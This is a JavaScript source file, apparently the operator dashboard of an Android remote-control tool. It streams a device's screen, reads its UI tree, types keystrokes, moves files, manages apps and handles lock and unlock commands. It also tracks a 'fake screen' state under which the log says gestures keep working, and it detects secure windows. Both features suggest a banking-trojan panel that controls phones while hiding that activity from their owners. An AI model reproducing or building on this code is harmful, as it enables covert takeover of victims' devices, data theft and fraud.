'use strict';

class AlphaDash {

  constructor() {
    this.ws           = null;
    this.activeDevice = null;
    this.activePanel  = 'vnc';
    this.vnc   = null;
    this.ly    = null;
    this.apps  = null;
    this.lock  = null;
    this.files = null;
    this._deviceMeta = new Map();
    this._boot();
  }

  _boot() {
    const token = localStorage.getItem('alpha_token');
    if (!token) { location.href = '/login.html'; return; }
    this._initUI();
    this._connect(token);
  }

  _connect(token) {
    this.ws = new AlphaWs(token);

    this.ws
      .on('connected',          ()  => this._onConnected())
      .on('disconnected',       ()  => this._onDisconnected())
      .on('devices_list',       (d) => this._onDeviceList(d))
      .on('device_online',      (d) => this._onDeviceOnline(d))
      .on('device_offline',     (d) => this._onDeviceOffline(d))
      .on('vnc_frame',          (d) => this.vnc?.onFrame(d))
      .on('screen_hierarchy',   (d) => this.ly?.onHierarchy(d))
      .on('secure_window',      (d) => { this.vnc?.onSecureWindow(d.secure); this.ly?.onSecureWindow(d.secure); })
      .on('fake_screen_active', (d) => this._onFakeScreen(d))
      .on('installed_apps',     (d) => this.apps?.onAppList(d))
      .on('file_list',          (d) => this.files?.onFileList(d))
      .on('file_chunk',         (d) => this.files?.onFileChunk(d))
      .on('file_upload_done',   (d) => this.files?.onOpResult(d))
      .on('lock_status',        (d) => this.lock?.onLockStatus(d))
      .on('cmd_result',         (d) => {
        this.apps?.onCmdResult(d);
        this.lock?.onUnlockResult(d);
        this.files?.onOpResult(d);
        this._logCmd(d);
      });
  }

  // ── Connection ────────────────────────────────────────────────────────────

  _onConnected() {
    const dot = document.getElementById('statusDot');
    if (dot) { dot.textContent = '● Online'; dot.style.color = '#00ff9d'; }
  }

  _onDisconnected() {
    const dot = document.getElementById('statusDot');
    if (dot) { dot.textContent = '○ Offline'; dot.style.color = '#ff4444'; }
  }

  // ── Device events ─────────────────────────────────────────────────────────

  _onDeviceList({ devices, online }) {
    this._deviceMeta.clear();
    for (const d of devices) {
      this._deviceMeta.set(d.id, { ...d, online: online.includes(d.id) });
    }
    this._renderDeviceList();
  }

  _onDeviceOnline({ id, model }) {
    const existing = this._deviceMeta.get(id) || { id };
    this._deviceMeta.set(id, { ...existing, model: model || existing.model, online: true });
    this._renderDeviceList();
    this._logSystem(`Device online: ${(model || id).substring(0, 30)}`);
  }

  _onDeviceOffline({ id }) {
    const m = this._deviceMeta.get(id);
    if (m) { m.online = false; this._renderDeviceList(); }
    this._logSystem(`Device offline: ${id.substring(0, 8)}`);
  }

  _onFakeScreen({ id, active }) {
    if (id !== this.activeDevice) return;
    const badge = document.getElementById('fakeScreenBadge');
    if (badge) badge.style.display = active ? 'flex' : 'none';
    if (active) {
      this._logSystem('⚠ Fake screen active on device — Ly/gestures unaffected');
    }
  }

  // ── UI init ───────────────────────────────────────────────────────────────

  _initUI() {
    this._devListEl   = document.getElementById('devList');
    this._activeDevEl = document.getElementById('activeDevice');
    this._fpsEl       = document.getElementById('fpsCtr');

    this._panelEls = {
      vnc:   document.getElementById('panelVnc'),
      ly:    document.getElementById('panelLy'),
      apps:  document.getElementById('panelApps'),
      lock:  document.getElementById('panelLock'),
      files: document.getElementById('panelFiles'),
    };

    // Panel tabs
    document.querySelectorAll('[data-panel]').forEach(btn => {
      btn.onclick = () => this._switchPanel(btn.dataset.panel);
    });

    // Global nav buttons
    const nav = (id, cmd) => {
      document.getElementById(id)?.addEventListener('click', () => {
        if (this.activeDevice) this.ws.cmd(this.activeDevice, cmd, {});
      });
    };
    nav('btnWake',    'WAKEUP');
    nav('btnBack',    'BACK');
    nav('btnHome',    'HOME');
    nav('btnRecents', 'RECENTS');
    nav('btnNotif',   'NOTIFICATIONS');
    nav('btnLock',    'LOCK_DEVICE');
    nav('btnVolUp',   'VOLUME_UP');
    nav('btnVolDn',   'VOLUME_DOWN');

    // Logout
    document.getElementById('btnLogout')?.addEventListener('click', () => {
      localStorage.removeItem('alpha_token');
      location.href = '/login.html';
    });

    // Quality slider
    const qSlider = document.getElementById('vncQuality');
    const qVal    = document.getElementById('vncQualityVal');
    if (qSlider) {
      qSlider.oninput = (e) => {
        if (qVal) qVal.textContent = e.target.value;
        this.vnc?.setQuality(+e.target.value);
      };
    }

    // FPS select
    document.getElementById('vncFps')?.addEventListener('change', (e) => {
      this.vnc?.setFps(+e.target.value);
    });

    // Keyboard type input
    const typeInput = document.getElementById('typeInput');
    if (typeInput) {
      typeInput.addEventListener('keydown', (e) => {
        if (!this.activeDevice) return;
        if (e.key === 'Enter') {
          this.ws.cmd(this.activeDevice, 'TYPE', { text: '\n' });
          e.preventDefault();
        } else if (e.key === 'Backspace') {
          this.ws.cmd(this.activeDevice, 'TYPE', { text: '\b' });
          e.preventDefault();
        } else if (e.key.length === 1) {
          this.ws.cmd(this.activeDevice, 'TYPE', { text: e.key });
          e.preventDefault();
        }
      });
      // Prevent VNC canvas from stealing focus from typeInput
      typeInput.addEventListener('focus', () => {
        if (this.vnc) this.vnc._inputPaused = true;
      });
      typeInput.addEventListener('blur', () => {
        if (this.vnc) this.vnc._inputPaused = false;
      });
    }

    this._switchPanel('vnc');
    this._showVncOverlay(true);
  }

  // ── Device list render ────────────────────────────────────────────────────

  _renderDeviceList() {
    if (!this._devListEl) return;
    this._devListEl.innerHTML = '';
    if (!this._deviceMeta.size) {
      this._devListEl.innerHTML = '<div style="padding:12px 16px;color:#445566;font-size:.75rem">No devices registered</div>';
      return;
    }
    for (const [id, meta] of this._deviceMeta) {
      const li = document.createElement('div');
      li.className = 'dev-item' + (id === this.activeDevice ? ' selected' : '');
      const label = meta.model ? meta.model.substring(0, 24) : 'Unknown Device';
      li.innerHTML = `
        <span class="dev-dot ${meta.online ? 'online' : 'offline'}"></span>
        <div class="dev-info">
          <div class="dev-model">${this._esc(label)}</div>
          <div class="dev-id">${id.substring(0, 8)}…</div>
        </div>
        <div class="dev-sdk">API ${meta.sdk || '—'}</div>
      `;
      li.onclick = () => this._selectDevice(id, meta);
      this._devListEl.appendChild(li);
    }
  }

  // ── Device selection ──────────────────────────────────────────────────────

  _selectDevice(id, meta) {
    this._teardownModules();
    this.activeDevice = id;

    if (this._activeDevEl)
      this._activeDevEl.textContent = meta.model || id.substring(0, 8);

    // Clear fake badge on device switch
    const badge = document.getElementById('fakeScreenBadge');
    if (badge) badge.style.display = 'none';

    this._renderDeviceList();
    this._buildModules(id);
    this._showVncOverlay(false);
    this._switchPanel(this.activePanel);

    // Request initial device info
    this.ws.cmd(id, 'GET_DEVICE_INFO', {});
    this.ws.cmd(id, 'GET_LOCK_STATUS', {});
  }

  _buildModules(id) {
    const canvas = document.getElementById('vncCanvas');
    if (canvas) {
      this.vnc = new AlphaVnc(canvas, this.ws, id);
      this.vnc.setFpsDisplay(this._fpsEl);
    }
    const svg = document.getElementById('lySvg');
    if (svg) this.ly = new AlphaLy(svg, this.ws, id);

    const appsEl = document.getElementById('panelApps');
    if (appsEl) this.apps = new AlphaAppManager(appsEl, this.ws, id);

    const lockEl = document.getElementById('panelLock');
    if (lockEl) this.lock = new AlphaLockManager(lockEl, this.ws, id);

    const filesEl = document.getElementById('panelFiles');
    if (filesEl) this.files = new AlphaFileManager(filesEl, this.ws, id);
  }

  _teardownModules() {
    this.vnc?.destroy();   this.vnc   = null;
    this.ly?.stop();       this.ly    = null;
    this.lock?.destroy?.(); this.lock = null;
    this.files = null;     this.apps  = null;
  }

  // ── Panel switching ───────────────────────────────────────────────────────

  _switchPanel(name) {
    this.activePanel = name;

    for (const [k, el] of Object.entries(this._panelEls)) {
      if (el) el.style.display = k === name ? '' : 'none';
    }

    document.querySelectorAll('[data-panel]').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.panel === name);
    });

    if (!this.activeDevice) return;

    if (name === 'vnc') {
      const q = +(document.getElementById('vncQuality')?.value || 50);
      const f = +(document.getElementById('vncFps')?.value || 20);
      this.vnc?.start(q, f);
      this.ly?.stop();
    } else if (name === 'ly') {
      this.vnc?.stop();
      const poll = document.getElementById('lyPoll')?.checked !== false;
      const ms   = +(document.getElementById('lyInterval')?.value || 700);
      if (poll) this.ly?.start(ms); else this.ly?.stop();
    } else {
      this.vnc?.stop();
      this.ly?.stop();
      if (name === 'apps' && this.apps) this.apps.refresh();
    }
  }

  // ── VNC overlay ───────────────────────────────────────────────────────────

  _showVncOverlay(show) {
    const overlay = document.getElementById('vncOverlay');
    if (overlay) overlay.style.display = show ? 'flex' : 'none';
  }

  // ── Cmd log ───────────────────────────────────────────────────────────────

  _logCmd({ cmd, success, msg, pkg, path }) {
    const detail = pkg || path || msg || '';
    this._log(
      `${cmd}  ${success ? '✓' : '✗'}  ${detail}`,
      success ? 'ok' : 'err'
    );
  }

  _logSystem(text) {
    this._log(text, 'sys');
  }

  _log(text, cls = '') {
    const log = document.getElementById('cmdLog');
    if (!log) return;
    const e = document.createElement('div');
    e.className = 'log-entry ' + cls;
    e.textContent = `${new Date().toTimeString().slice(0, 8)}  ${text}`;
    log.prepend(e);
    while (log.children.length > 60) log.removeChild(log.lastChild);
  }

  _esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;'); }
}

document.addEventListener('DOMContentLoaded', () => { window._dash = new AlphaDash(); });
